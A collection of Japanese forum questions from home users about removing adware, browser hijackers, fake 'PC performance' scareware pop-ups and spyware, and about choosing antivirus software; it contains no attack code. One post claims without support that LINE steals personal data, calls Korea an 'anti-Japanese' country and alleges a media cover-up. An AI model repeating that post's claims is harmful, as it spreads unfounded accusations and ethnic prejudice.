以前よりレッグクリーンプロなるところから作業中にいきなりＰＣの安全関係の画面に強引に誘導されて、消すのにいつもイライラしていましたが、最近音声により「警告」など、その強引性が増してきました。 きょうは画面に大きくオレンジ色の文字で「スパイウエアが…」云々の警告が現れ、これが本当のことなのかどうか非常に戸惑っています。 本当ならばまた課金してこの対策をしなければいけないのでしょうか？ また、これは無視していてもよいものなのでしょうか。 どなたかわかるかた、いらっしゃいましたらお願いいたします。 文字化けもひどくなっていて、大変心配です。
最近、PCに「お使いのPCの動作が遅いです」という広告が出てくるようになりました。 他にもいろいろな広告が出るのですが、こいつが最も多いです。 まず自分で調べてみると、「Yontoo」というやつのしわざではないか、というサイトがいくつかありました。ので、プログラムから検索してみると、なんと「Yontoo」がいました。そしてしっかりと手順を踏みアンインストールしました。 これで一件落着、と思いきや、またもや広告が出てきました。赤い背景に黄色い三角の記号と「お使いのPCの動作が遅いです」という文字。そう、まったく同じ広告が何食わぬ顔で現れました。 他にもいろいろなソフト名をプログラムから調べましたが、どれもこれも該当せず。 いったい何の仕業だろう、と考えましたが全くわかる気配もなく、思い切ってここで質問させていただきました。 こういったスパイウェアやウィルスに知識のある方、対策をご存知の方、ぜひご教授願います。
カスペルスキーとウィルスセキュリティーでないAviraのアンチだか忘れましたが一緒に使用しても大丈夫でしょうか？競合しないかどうか心配なんですが。カスペルスキーにもAviraみたいソフトありますがどちらのソフトがお勧めでしょうか？カスペルスキーとAviraもスパムソフトみたいのを二つ同時に入れても大丈夫なのでしょうか？宜しくお願いします。
気づくとなぜか、タブレットのホーム画面のシートの一番最初が、 baiduの検索画面になっていました。 見たらわかるとは思いますが、androidタブレットです。 バージョンはキットカットのやつです。 入ってしまったのは百歩譲っていいとして、中国語なのはどうしてもゆるせないです。読めない検索サイトなんて要りません。邪魔です(..) どなたか消しかたをお教えください。 せめて日本語化する方法でもいいので！よろしくお願いいたします。
Win7　home のIE10の右クリックサーチが急にCube Searchなるものに変わってしまいました。 駆除の方法とGoogleに戻す方法を教えて下さい。
ゴムプレーヤーを新規インストールしてからおかしくなりました。ブラウザを開くと汚染ファイルが見つかりました、今すぐダウンロードなどの怪しいページが出ました。正確に言えば、コーデックを追加インストールしたときに不正プログラムが入ったと思い、システム構成でスタート等色々変更しましたが、回復しませんでした。このとき他のパソコンでは正常に動いていました。使い始めて間もないパソコンだったので、リカバリーデスクでウインドーズを入れなおしました。しかし、インストール後しばらくしたら、再びブラウザを開くと同じ状況になりました。他のパソコンで確認すると、このパソコンも同じ状況になっていました。私には修復は不可能と思い、皆様方のお力に頼りたいと思います、よろしくお願いいたします。 私の環境を簡単に書いておきます。 パソコン、去年の12月にパソコン工房で買ったウインドー7、メモリは8ギガ 使っているブラウザはクロームです。IEでも同じ状況になります。 インストールしたソフトは、オープンオフィス、サンダーバード、キングソフトのオフィス、マイクロソフトのアクセス2013 インターネットの環境は、プロバイダーから借りているバッファローのPortableWi-Fi---DWR-PGです。ドコモの3Gなので1メガくらいしか出ていません。これをデスクトップ有線でつないでいます。ノートは無線です。 ブラウザのスクリーンショットを添付しおきます。 よろしくお願いいたします。
ウィルスソフト位しかインストールしてなくて気がかりなんですが、自分のIPアドレスかIPアドレスが送られてくるのか分かりませんが、下のURLがアドレスが表示されいろんなIPアドレスが確認できるんですが勝手に何を使用としてるのでしょうか？http://prof.eorezo.com/cgi-bin/get_ .... get_以降URLが続きます。 確認出来たIPアドレスはこちらです。不安なんですが何か送信されてるのでしょうか？ 106. 172. 30. 89 91. 121 .14 .155 188. 165 . 192. 179 削除などするにはどうしたらよいのでしょうか？宜しくお願いします。 speedo Analysisとvideo Performerは安全でしょうか？video Performerはアップデートを勧められます。
使用して良いか迷ってるんですが、 Daemon Tools Liteって脅威を感じるソフトで良くないのでしょうか？そうだった場合どのような悪影響が出るのでしょうか？ あと、下記のサイトはどうでしょうか？ MountSpace レジストの削除をしなさいと広告表示されますがどの様にすればよいのでしょうか？アドオンには思い当たる名前はないんですが。 それとカスペルスキーを使用してますが、アビラと一緒のソフトを使用しても構わないでしょうか？ウィルス対策ソフトと一緒に使えるようなお勧めなソフトってありますか？ 宜しくお願いします。
「Baidu IME」「Simeji」が、利用者に無断で文字入力の内容を自社サーバに送信している報道されました。この件はセキュリティ会社が発表したとされていますが　この問題をセキュリティ会社以外で見つけ出せたものでしょうか。 ウィルスソフトやスパイウェア対策ではチェックができないのでしょうか。 一般のものが　自分のパソコンでデーター送信状況を調べる、不正なところに送っていることを調べることはできるものでしょうか。 パソコンは　常時データーをサーバーに送っているものと思います。（検索や　Ｊａｖａ等を使っての計算は　サーバーとのデーターの送受信をしないことにはできないと思います） データーの送受信の調べ方がよくわかりません。 またデーターの送受信の方法がわかったとしたら　個人情報等を勝手に送信しているかは　どうやって調べたらいいのでしょうか。 送信状況が分かってもその中から膨大なデーターの中から　不正な送信を見分ける方法もあるのでしょうか。
インターネットに接続すると突然スパイウェアーが検出されました。「お使いのパソコンの性能が低下しています！Windowsのエラーを直ちに修正してくださいsystemweak.com」と表示されて、どのページに移動してもこのメッセージが消えません。これを決にはどうすればよいのでしょうか？
　これって何かの不具合があるって事でしょうか？
baidu(百度）はキーロガーとして、個人情報が抜かれる危険性が多くの人に知れ渡り、叩かれました が、lineに関してはマスコミもやっている人間も全然騒がないどころか、進める流れです。 多くの日本人はLINEに個人情報を抜かれている事実を知らないのでしょうか？ このアプリも、百度（中国）と同じ様に日本の企業ではなく、反日思想の国、韓国製です。 マスコミもLINEの危険性には触れません。（韓流、通名報道、韓国の犯罪・マイナスなニュースは一切流さない態度から当然でしょうが） この反応の違いについて教えてください。
父のパソコンなので、詳しい経緯は分からないのですが、無料でパソコンの調子を良くするというフレーズのスパイウェアなどをインストールしてしまったようで、（幾つ入れてるかも分かりません）インターネットエクスプローラーで検索しても文字化けして、まともに見れない。プリンターで印刷しようとしてもオフラインだと言われる（これがスパイウェアか分かりませんが外に思い当たりません）、などなど、色んな事がおかしくなっています。 ちなみに、添付画像のような、男の人の顔のアイコンが常時、色んなところで出てきます。 システムの復元は試しましたが、ムダでした。 このソフトは何というソフトなのでしょうか？また、どうすれば削除することが出来ますか？ ちなみにＯＳはＷｉｎｄｏｗｓ７です。
ハッカーのハッキングが100％成功し、そのハッカーが電源の切れている自分のPCに侵入しようとしていると仮定します。その場合、電源が切れていても、ハッキングはされてしまうのでしょうか？ 回答よろしくお願いいたします。
ウイルス駆除ソフトを使って検査すると、その内の何個かは メモリー上にあるため削除できません。と出て再起動後に 再検査しますか？　となって再起動して再度検査しますが やはり削除できません。 これを取り除くにはどのようにしたら良いのでしょうか？ ソフトはAvastでOSはWin7とVistaです。
エロサイトを見ていたら、料金の請求のポップアップがデスクトップに出るようになってしまいました。 これが出ないようにするにはどうすれば良いでしょうか？
何かのフリーソフトについてきたプログラムで、無視すればよかったんですが、うつかにも無料でＰＣファイルをバックアップという言葉につられて、途中まで登録してしまいました(名前、メアドなどです)。バックアップが始まると思いきや、途中から「ここから先は課金しますよ」「でも今なら30％オフですよ」的なメッセージ(英語です)が出てきたので、怖くなって閉じました。 その後ＭｙＰＣ　ＢＡＣＫＵＰ自体はすぐにアンインストールしたのですが、メアドを登録してしまったために、「もっと値下げしますよ。今日なら50％です」みたいな英語メールが何度も来るようになりました。まあそれは迷惑メールとして開かずに無視すればいいだけのことなのですが、心配なのは登録途中までの段階で、何か大事な情報が盗まれていないかということです。 Ａｄｖａｎｃｅｄ　ＳｙｓｔｅｍＣａｒｅなどのソフトでマルウエアに感染していないかチェックしましたが、とくに異常はなさそうです。でも少し心配です。 何か対処した方がいいのでしょうか。詳しい方教えてください。
先日AppleIDが不正ログインされてしまいました。幸い金銭被害はそんなになかったのですが、パスワードは他のサービスでも同じものを使っていたのですべて変更するのが大変でした。 みなさんはパスワードの管理はどのようにしていますか？ １）ほとんど同じパスワードを使いまわしている。 ２）パスワードの一部の文字（数字）を変えて使いまわしている。例（1234abcd01 1234abcd02など） ３）サイトごとに異なるパスワードを使用している。 ４）実物のメモ帳などにメモを取って保存している。 ５）パソコンのメモ帳、管理ソフトを使用している。 当てはまるものあげて下さい。自分が覚えやすく他人から予測されずらいパスワードの作り方もお願いします。
googleから下記のようなメールが送られてきました。案内のとおりに進んで問題ないのでしょうか？見た目は問題なさそうに見えるのですが....。お教えください。 「　○○ 様、Google をご利用いただきありがとうございます。 お使いの Google アカウント（xxxxxxxxxx）の予備の電話番号が最近変更されました。ご自身が変更した場合は、特に何もする必要はありません。 予備の電話番号を変更していない場合は、お使いのアカウントが不正使用されている可能性があります。詳しくは次のページをご覧ください:　」 宜しくお願いいたします。
質問があります。 Googlechromeのシークレットモードは本当にシークレットの役目を果たしているのでしょうか？ 私は普段からインターネットはchromeのシークレットモードで見るようにしているのですが、先日とある釣りのサイトを訪問し、サイトを端から端まで閲覧したところ、その後いたるところの広告欄?にこのサイトが表示されるようになりました。 あまり詳しくはないのですが、こういうのはクッキー?の影響ですよね？ アダルトサイトなどを見てもそうはならなかったので普通のサイトでなった事にビックリしています。 翌々考えると楽天やamazonなどもなんとなく検索結果のクッキー?が残っていて表示されることがあるような気がします。 現状を説明しておくと 普段はほとんどグーグルクロームのシークレットモードでのインターネットサーフィンをしております。 このシークレットモードはクロームのショートカットのプロパティのリンクに「incognito」を付け足したものを使用しております。 シークレットモードでないショートカットもあり、たまに使用しますが、こちらで釣り関係のサイトを見ることはありません。 楽天・アマゾンのログインはシークレットモードで行っています。 以上です。 シークレットモードを使用している理由も、こんなことしても無駄なことは理解していますがネットの過度の情報収集が嫌で気持ち程度でやっているものです。 同じ理由でiphoneからはログインの類は一切しないことにしております。（facebook.twitter他） しっかりとした知識があればしっかりとブロックできるのかもしれませんが今更ながらネットは怖いです。 無知故の恐怖なのかもしれませんがよろしくお願い致します。
YouTubeを再生していたら、突然問題が発生して、解決してくださいとでました。それを押したら、スマートPCWinZipが出てきて、インストルしてくださいとなり、ダウンロードしました。分からないのは、これです、スマートPCWinZipというのが何なのか？ウイルスバスターを入れているのに？
ウィンドウズ７リペリアツールのダウンロードの表示が執拗に出ます其の他にもd.advestream.comも出て困っています。これらの表示を止める方法を教えてください。
お世話になります。 フリーのオフィスソフトをインストールしましたら、 入り込まれたようです。 プラウザはグーグルクロムです。 ★お使いのパソコンがスパイウェアーに感染しています、こちらを直ぐにダウンロードしてスキャンしてください。★ とか、いろいろなメッセージでチカチカさせながら（四角の枠）頻繁に出没します。 何とかしようと、探しましたら。 グーグルクロムの設定のコンテンツの中の管理で例外の管理と言うのがありまして。 そこに、Jexample.comと言う見慣れないモノが入っていたので。それが犯人かと思います。 何箇所かに亘っているのですが、設定選択で許可とブロックと一か所が終了時消去とあったので ブロックと終了時消去に設定したのですが、何度繰り返しても、 許可に戻ってしまいます。その辺に頻繁に出るので困り果てています。 早急に削除したいので、何卒よろしくおねがいいたします。
毎年年末、ノートンセキュリティー、５，２７０円を購入して、自分の３台のＰＣに導入しています。 推奨では、Ｗｅｂからやるのが良いと言っています。コンピュータ屋さんから円盤を購入すると、3台まで、有効になりますが、Ｗｅｂからでもできるのですか？ ＰＣ不慣れのため、初歩の質問ですみません。
Please support this site by watching this video と訳わからないポップアップが最近出るようになりました これが出ると、閉じてもまた出てくるし、 セキュリティーソフトにも引っかからないから最悪！！ これってヤバイものですか？ また、削除方法知ってる方いませんか？
キーロガの感染で 気になること。 感染すると (1) キーボードの全ての操作を記録するのか？ ➁ それとも ログインの必要なサイトのみで記録したりするのか？ (3) 大文字のみ や 小文字のみ記録するといった 場合もあるのか？ この３つ の内どれが？ 近いですか？。 また 感染し 操作を 記録された場合に そのデータを外部に 送信するタイミングは？ (1) まとめて 記録したデーターなりを送信するのか？ ➁ それとも 決められた 一定の時間間隔で 送信するのか？ (3) 上記以外で たとえば Aと打つと 悪意ある者のPCにも Aと確認できるのか？ 上記の 内で 近いもの 正しいものが分かれば 教えてほしいです。 Keylogger という検出名の ウイルスに感染させても 具体的に どのような 動きをしているのか？が分かりません。 使用感 としては 画面の描写が あきらかに おかしくはなってます。 VirusTotalで Keylogger のほかに Agent などの検出名が出てます。 また 操作を記録するとは テキストではないにしろ どこかに そのデータが あるハズ と考えますが それは どのような場所が 考えられますか？
バイドゥという中国系企業から無償DLできる日本語変換ソフトが、その内容を中国本土へ転送しているというニュースを聞きました。「矢張りそうか」と勝手に納得したのですが・・・。 ふと自分のPCを考えてみると、日本語変換ソフトはGoogleの無償版だし、少し遡ればMSのソフトです。 GoogleもMSも、中国企業が出来た技術ですから、やろうと思えばいくらでもできると思いますが、その事実はあり得るものですか？ まあ、自分のPCから盗んだ情報が、誰かの益になるとは思っておりませんが^^;
実際存在しないエラーをウインドウに表示して対策ソフトを購入させる悪質な広告が インターネットエクスプロ－ラーで表示されるようになりパソコンを出荷時の状態に戻したのですがまだ表示されます。出荷時に戻したのにどうして表示されるのでしょうか？またどうすれば削除できるでしょうか？
スパム検索などで以下のものが出てきますが、どれを削除した方が良いのでしょうか？ 全部削除しましたらパソコンの調子が悪くなりました（アイコンをクリックしても無反応、再起動不能） 不調になったのはSpyHunterかiobitのソフトが原因なのかは分かりません。iobitのアンチウィルスの方がおかしくなった確率が高いんですが、パソコンを修復したばかりなのでSpyHunterで出た結果を下記に記載しておきました。いっぺんソフトを起動してやると順番にどれが原因か順番に削除したいんですが宜しくお願いします。ちなみにSpyHunterを起動させるとパソコンが重くなります。アンインストールする予定なんですが沢山チェック出来るので入れてます。 カスペルスキーでウィルスチェックしても何も確認されませんでした。 出来れば大変危険なものはどれなのかなども教えて下さい。 Hotspot shield toolbar Adware Helpers 2o7 Pup.freemake video converter Weborama 宜しくお願いします。 あと、カスペルスキー、アクセラレーター、iobitのアンチを基本に使用してますが、お勧めな組み合わせないでしょうか？iobitやSpyHunterは外した方が良いでしょうか？
SUPERAntiSpywareの「Checking Definition Update」が2行目のCheckingのままで進みません！何処がおかしいのでしょうか教えて下さい！左上の丸い矢印が回転したまま全然進まないんです！
お使いのパソコンの性能が低下しています！という広告がChromeのあちらこちらに出てきた困っています。 いろいろ調べたところyontooというアドオンが一番臭いという記事をよく見るのですが、残念ながらそれらしいアドオンは見当たりませんでした。 どうすればこの鬱陶しい広告を消せるでしょうか。
MyPCBackupというのがいつの間にかPCに入っていて、開けるたびにバックアップを作れと警告が出ます。 うざいので消したいのですが、プログラムをアンインストールしようとすると、なぜかインストールの画面が出て、登録しろと言ってきます。 これをアンインストールする方法はないでしょうか。
https://www.tokerplay.com/signup　にて自分のクレジットカードの番号とそれの有効期限を書く欄があるのですが、お金が一切発生しないと書かれてますが、たとえそうであっても第３者がたとえばパソコンからもぐりこみ自分が記入したカード番号や有効期限の情報を得てその結果金が奪われるということはありますか？
お世話になります。 メインブラウザにChromeを使用していますが、ここ半年くらい インターネットで検索してホームページを開くと ページの一番下に　横長の広告動画で　「お使いのPC性能が低下していないか確認してください」 という広告が動画で張り付いてきます。広告主はMicrosoftだったり　Trust　Ratingだったりですが 非常に不愉快です。 このような広告が張り付かないようにする方法はありませんでしょうか？ 対処法を宜しくお願い致します。
プンタブのSAIを無料でダウンロードしたら、 ダウンロード後に「HAO１２３」という中国（？）のサイトが勝手にダウンロードされていました。 無料ダウンロードしたSAIのほうは、開けませんでした。 そのあと詐欺広告や外国のゲームなどの広告がでてきて SAIとHAO１２３をアンイントールしたのですが 詐欺広告が止みません。 勝手にタブが開いて外国のゲームなのかわかりませんが 開いたり、リンクが出てきたりユーチューブやネットで出てきます。 そのあといろいろ調べて再起動なども繰り返して 邪魔なプログラムを全てアンイントールしたのですが 出てきます。 どうしたらいいですか＞＜？
最近、インターネット銀行等で、ワンタイムパスワードを利用するところが増えており、その際、「ワンタイム認証用メールアドレス」の設定が必要になりますが、携帯電話やスマートフオンのメールアドレスの設定を推奨されるようです。 私も、一度は、スマートフオンのメールアドレスを設定したのですが、ワンタイムパスワード通知のメールが即時に到着せず、タイムラグがある場合があり、イライラし、結局はプロバイダーの提供するパソコンメールのメールアドレスに変更しました。 そこでお聞きしたいのですが、フリーメールのパソコンメールは、セキュリティの関係で好ましくないのは、なんとなく理解できる気もしますが、プロバイダーの提供するパソコンメールでは望ましくないのでしょうか。 何故、携帯電話やスマートフオンのメールアドレスでないといけないのか理解しかねていますので、お教え願います。
どうしたらハッキングされている証拠を掴めるでしょうか？ ・業者などに頼む場合はどこに頼めばいいでしょうか？ ・自分でログを探す場合は、どうやって探せばいいでしょうか？ 本などもおすすめがありましたら教えてください。
アドウエアの除去だけの遠隔サポートで７５００円って高すぎじゃないですか？
MacAfee SecurityCenterを見ると、インストールされているMacAfee VirusScanとMacAfee Personal Firewall Plus最新ではありませんでした。 今までMacAfeeから上記のプログラムを更新するよう催促が来ていました。しかし更新版は有償であることと、パソコンはインターネット閲覧にしか使用しないので、セキュリティを軽く見ていました。 そしてそののちセキュリティを強化しようと思うようになった次第です。 使用OSはWindowsXP sp3で、アンチウイルスソフトはMicrosoft Security Essentialsです。念のためWindowsfirewallは有効にしています。 無償でセキュリティを強化するために、MacAfee VirusScanとMacAfee Personal Firewall Plusをアンインストールして、その代わりにKINGSOFT PersonalFirewallを導入しようし、Windowsfirewallを無効にしようと考えているのですが、如何でしょうか。 MacAfee VirusScanの役割はMicrosoft Security Essentialsが担い、MacAfee Personal Firewall Plusの役割はKINGSOFT PersonalFirewallが担うと考えていますが、正しいですか。 セキュリティに関して無知であるため、分かりにくい文章になってしまいましたが、ご回答頂ける方は、回答よろしくお願いします。
面白半分でアダルト画像を見ていたら急に送金請求画面が出てしまいました。 調べるとWindows\System32\mshta.exeが入り込んでいました。 削除しようとすると「このファイルを変更するには、Trustendinstallerからのアクセス許可を得る必要があります」と表示されます。 削除する方法を教えて下さい。 宜しくお願いいたします。
少し前から、急に「お使いのPCがクラッシュ寸前です」というメッセージと共に、「OKをクリック「」して無料修理」という表示の下にOKボタンが出てきます。 怪しいのでこのOKボタンは押したことがないのですが、本表示を無くす方法をご存知のかたがいらっしゃいましたら教えて下さい。
はじめまして。 現在、Win7 Homeを使用しています。 最近、PC作業中に画面が一瞬暗くなる現象（ブラックアウト？）が頻発していたため、 ウィルス感染かと思い、トレンドマイクロオンラインスキャンを実施しました。 その際にスパイウェアとして『upt4pc_jp_22.exe』が引っかかったのですが、 検索してもファイルがヒットせずに削除出来ない状態です。 対処方法をご存じの方がいらっしゃいましたら、 教えて頂けますようにお願いします。 あと、通常はESETのウィルスソフトを使用しているのですが、 ESETでは、『upt4pc_jp_22.exe』の検知がされませんでした。 これは、トレンドマイクとの方が検知力が高いということでしょうか？ よろしくお願いします。
ヤフオクでPCを購入しました。 内容・スペックの割にあまりに安いのでどうせ落札できないだろうと思い入札しますとほかに入札者がいなく落札しました。 ＷＩＮ７でＯｆｆｉｃｅ２０１０がついてＣＰＵ２．４ＧＨｚ、２Ｇのメモリーで160GbのHDD、14インチで　届いたものはキーボードはあまりいい状態ではないですがそれ以外は　ディスプレーもきれいでバッテリーも4時間持つみたいです。富士通の14インチのモバイルパソコンで16000円でした。（さらにOffice2007のダックアップデスクもついていました） パソコンの調子は快調でHDDは使用時間8000時間、起動回数4500回でまだまだ使えそうです。 天板に大きな傷があるだけで他は異常がありません。（企業で使われていた４位前の機種のようです。） あまりにも程度がいいので疑ってしまします。 当初の内容にあまり見受けないソフトがあり　確認せずに消去しました。 よく考える　パソコンのデーター（クレジット、口座情報、個人のサイト）などを　勝手に送付するソフトなどが入っている可能性があります。 ウィルスソフトはＥＳＥＴを入れています。さらに定期的にAdvancedSystemCareでスキャンをかけています。 このパソコンが完全に安全と確認するために　どのようなことをすればいいでしょうか。
最近自分のパソコン画面に、Uniblue Speed MYPC2013と大きく真ん中に表示され、いろいろ稼働します。これを消去するにはどうしたら良いのでしょうか?　不必要なんです。消したいのです。
Spybot 2.1を使用時にドライブ・フォルダ・ファイル等の右クリックメニューに追加される Spybot Search&Destroy というメニューを表示しないようにするにはどうしたら良いですか？ 設定を自分なりに探して、 Setting > System Integration 内のWindows Explorer integration　（32bit・64bit両方共）の設定をかえたのですが、まだ表示されています。(右のボタンが[Install]になってる状態になってます。)
Windows7　を使用しています。 立ち上げると　 　Failed to create Conexant Audio Factory, Smartaudio will now exit の表示がでます。 調べていたのですが、ウィルスでしょうか？ 削除するにはどうすればいいでしょうか？ 現在使用しているのは　kingsoftの　antivirus　と　system　defender　です。 こちらではスキャンをしても検出されません。 ネット上でも 　Failed to create Conexant Audio Factory, Smartaudio will now exit を確認したのですが、よくわかりませんでした。 削除と対策方法を教えてください。
デスクトップ上に置いていたExcelファイルがこちらが何の操作もしていないのに何時の間にか消えてしまいました。Microsoft Security Essentialsでウィルスチェックは頻繁に行っているのでウィルスやスパイウェアは入っていないと思うのですが。不気味です。誰かが私のＰＣの中身を自由に見て大切なファイルを盗んで行っているのだとしたら、今後ＰＣを安心して使えないことになります。どなたか詳しい方、原因と解決方法を教えて頂けますか？
Java update に危険性はありますか。 Trust Rating と、添付画像のものが出るようになりました。 （これは、システムの復元で消えました。） この悪質なもののダウンロードは、 はじめはAvast（無料版）の最新バージョンのダウンロードを疑いましたが、 システムの復元をしてみて、Avastではないことがわかりました。 その前日に、Java update のインストールの準備ができたと 何度もポップアップが出るのでダウンロードしました。 復元ポイントが２日連続であって、 Avastの最新バージョンを消しても悪質なものは消えませんでしたが、 その前日のJava updateが消える復元で悪質なものは消えました。 この２回の復元によって影響した（消えた）のは、 Avast と Java update だけです。 Java update をする前の状態に復元したので、 また、Java update を促すポップアップが出ます。 また、同じ繰り返しになるといけないので、 Java update はしていません。 このJava update を促すポップアップは インターネット閲覧中にインターネットサイトが真っ暗になって、 Java update のポップアップが突然に出ます。 Windows 8に慣れていないので、これで普通なのかどうなのか わかりません。 Java update は Windows 8では、こんな出方をするのかも 教えていただきたいです。
『Youtubuバラエティ動画サイト』を、ずーっと利用していたのですが、ある日突然、サイトの右下に画面の1/4くらい占める広告が入るようになりました。一応、その広告内の右上に、消去するための小さな×印があるのですが、新たなページを開くたびに、その位置固定された広告が、サイトの内容を邪魔するように入ってきます。このストーカーのような勘違いをした広告が二度と出ないようにする方法はないのでしょうか。 ちなみに、他のPCで、このサイトを見たら、こういった広告が出てこないので、特定のPCにとり憑いたものと思われます。 この悪魔を駆除する方法を、どうぞ、よろしくご教示ください。
過去の質問　http://oshiete.goo.ne.jp/qa/7959848.html　と同じですが、 プログラムのアンインストールの一覧の中に Yontoo がありません。 どうすれば消せますか。 Windows 8 です。
Firefoxの最新版をwinVistaで使用していましたが、最近不当な広告が強制的に出るようになりました。 たとえばＮＨＫのページでも出ます。 特別なプラグインなどは入れていません。 「性能が落ちている」とか「スパイウエアが見つかった」のどの警告や 経過時間ごとに広告がはいります。 スクリーンショットを添付します。 問題画面のhtmlのソースを見てもそれらの広告情報はみつからないようです。 Ｆｉｒｅｆｏｘをインストールしないといけないでしょうか？ その他注意事項など教えてください。
ノートンがあればセキュティは大体安全ですか ウインドウズ８標準のファイヤーウォールはどのくらい信頼できますか ルータのポートを塞ぐ必要がありますか 最近のルータは無線ばかりなので 有線の古いルータを買いました
ある定番のソフトをインストールしようとしたら、偽サイトで全く違うソフトが少なくとも４つインストールされてしまいました。全てアンインストールしたのですが、Ads広告で残るようになりました。 「おつかいのパソコンが低下していないか確認してください」とか「ディスクの空き容量低下」「ダウンロードの前に」「警告！お使いのPCがクラッシュ寸前です！OKをクリックして無料修理」とかでます。 消す方法はありませんでしょうか？ トレンドマイクロでオンラインスキャンするとスパイウェアが１つありますとでますが、無料版か製品版を買わないと除去できないようで、マイクロソフトやF-secure Internet Security 2013では検出されませんでした。 どなたかお助け下さい。
iTunesをダウンロードしてインストールした後から、様々なホームページにスパイウェアに感染しているなどのバナーがいくつも表示されて困っています。 解決方法はありませんか？
おはようございます。 先日海外からあるフォントをダウンロードした際に 一緒に落としたダウンローダーからスパイウェアが混入したようです。 Firefoxをブラウザとして使用しているのですが Googleのトップ画面から勝手に変更されてしまいます。 URLには http://websearch.relevantsearch.info/? とでています。 ウィルスバスターでは取り除く事ができませんでした。 どなたか対応方法を知っている方居たら教えてください！
ボタンをクリックすると 自宅の個人用パソコンです インターネットを閲覧していると、ときどき 【ブラウザーがたくさん開きます】 －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ 規定のメールクライアントが正しくインストールされていないため、この操作を実行できませんでした と、メッセージがでて 【【ボタンをクリック】】すると mailto:seawaves1173@h4.dion.ne.jp（←ＵＲＬ） ブラウザーが、7つぐらい開いて、パソコンが重くなります 最後の開いたブラウザーには 【【【このページは表示できません •Web アドレス //ieframe.dll/dnserror.htm# が正しいか確かめてください。 •検索エンジンでそのページを探してください。 •数分待ってから、ページを最新の情報に更新してください。】】】 と、インターネット接続しているにも、かかわらず 空白のブラウザーが表示されます －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ これは、何の症状でしょうか？ どうしたら、よいのか、わからないので、よろしくお願いいたします OSは、Windows　7　homeを使っています
Windows7を使用していまして、先日トロイの木馬に感染しました。 Microsoft Security Essencialを使っており、こちらにて一応隔離されたようなのですが、このことが起こってから明らかにPCの起動時間などが遅くなってしまいました。 （特に新しいソフトをインストールしたわけでもありませんし、設定も変えていません。） 例えば「ようこそ」から起動するまでの時間が毎回10分以上かかってしまうような感じです。 感染する前までは遅くても3分程度だったのですが・・・ 起動時間だけじゃなく全体的に明らかにパフォーマンスが遅くなっています。 これはまだ完全に駆除されていないということでしょうか？今はMSEで再スキャンしても脅威は発見されない状態ではありますが・・・ やっぱり有料のウイルスソフトを使った方がいいのでしょうか？ それとも、もう再セットアップするしか改善の方法はないのでしょうか？あまりしたくないのですが・・・ 対応策について教えてください。
パソコンのスパイウェアって、もし自分のパソコンにインストールされちゃって、その状態で、YouTubeから音楽を無料ダウンロードしたりすると、その行動や操作画面などがスパイウェアにキャプチャーされたり、録画されたりして、そのデータをスパイウェアが、インターネットに公開したりして、その結果、警察に発見されて、逮捕されたりする事ってありますか？
現在ある最高性能のコンピューターだと、総当りでパスワードをクラックするのにどれくらいの時間がかかるのでしょうか？ https://howsecureismypassword.net/ 上記のサイトで試すと、数字・大文字・小文字・記号混在で10桁で約500年、11桁で50000年と出ますが、現在はもっと短縮されているのでしょうか？ 上記を参考に、パスワードは文字種混在で11桁あれば十分と考えていたのですが、危険でしょうか？（Truecryptなどを使うと32文字以上を推奨されますが・・・）
私のメールが大量送信に使われました。 サーバー会社から大量送信の事実とパスワードを変更したとの連絡があり、気がつきました。 一回目はメールパスワードの変更をしたのですが、すぐに再度同じことが起こりました。 仕方なく新しいメールアドレスとパスワードを作ったのですが、しばらくしてまた同じように大量送信に使われてしまいました。 PCのほうはセキュリティソフトやspybotなどですべてスキャンしているのですが、なにも見つけることができません。 メールソフトは最初はoutlookで、新しいメールアドレスにしたときはwindows live mailを使いました。 サーバーはロリポップです。 セキュリティソフトはバスターです。 原因を知りたいのと対策を考えたいのですが、詳しい方がいらっしゃいましたらどうか教えてください。
ノートンがスパイウェア対策をとる以前、スパイウェア対策としてスパイボットやペストパトロールを 使っていました。スキャン結果ではいくつか検出されたのを覚えています。 しかし、現在使用中のノートンインターネットセキュリティー2010では一つも検出されません。 私の知識不足かもしれませんが、履歴で確認してもスパイウェアが検出されているかどうかも わかりません。 　 ノートンのスパイウェア対策では検出が不十分なのか、それと確認の仕方を教えてください。
身に覚えがないアダルトサイトから、「登録済み」「早く入金を」というメッセージ付きのエッチな画像が、パソコンを立ち上げるたびに出てきます。このサイトで、質問させてもらい、何人かの方から回答もいただき、うまくいったと思い、お礼を打ってシャットダウンしました。再度立ち上げると、何とまたまた同じ画面が現われました。どうしたら良いのでしょうか?教えてください。 今回の対処法としては、「マルウェアプロテクターソフト」のクレバーブリッジ社のWiinZipを購入して、ウィルスを駆除したのですが、うまくいかなかったのでしょうか?
Websearch.oversearch.infoなるウィルスに入り込まれたようです。 一刻も早く削除、アンインストールしたいのですが、 その方法がわかりません。 どなたかその方法を教えていただけないでしょうか？ 何卒宜しくお願いいたします。
ＷＥＢブラウザ（FireFox)に「Microsoft CERTIFIED Partner　お使いのパソコンの性能が低下しています Windowsのエラーを直ちに修正してください」と表示されてしまいます。 ネットで調べるとスパイウエア、マルウエア等の様ですが表示されないようにするにはどうすれば良いでしょうか？ PC Windows 7 Pro FireFox 24.0 今までとった処置としては．．．． ○キャッシュ削除　＝＞効果無し　　 ○クッキー削除　＝＞　効果無し ○コントロールパネルのプログラムと機能で Resarch を削除　＝＞効果は有ったが、しばらくしたら又、表示されるようになった。 　プログラムと機能にはResarchは現在、表示されない。 ○IObit Uninstaller　でもResearch、AutoComplete Pro、RegCleanProは表示されてない。 ○IObit Uninstallerで「yontoo」、「Lyric star」、「hapyy lyricss」、「WebCake」、「Lyrics Finder」「Lyrics Search」「Cool Lyrics」「LyricsFolder」 　は表示されていないので削除出来ていない。 ○FireFox のアドオンには不審なものは無いようだ。 ○タスクマネージャーにRegCleanProは見当たらない。 現状ではこんなところです。 他に確認する箇所は有るでしょうか？
※PC初心者なので、足りない情報があれば言ってください。 WIN7のホームプレミアムでセキュリティにフリー版のAVGを使っています。 システムのスキャン結果を見るとどうやらトロイの木馬（Dropper.Generic8.BZVNとあります)に感染してしまったようなのです。 いろいろ検索してみて、トロイバスターを試してみようとしたのですが、起動しようとしても「ユーザーアカウント制御」が出て、管理者アカウントのパスを入力しても名前が見つからないなどのエラーで開けません。 試しに管理者のアカウントにユーザー切り替えで入ろうとしてもダメでした。 何から手をつけて解決していけばいいか分からなくなってしまったので、助けていただきたいです。 お願いします・・・・
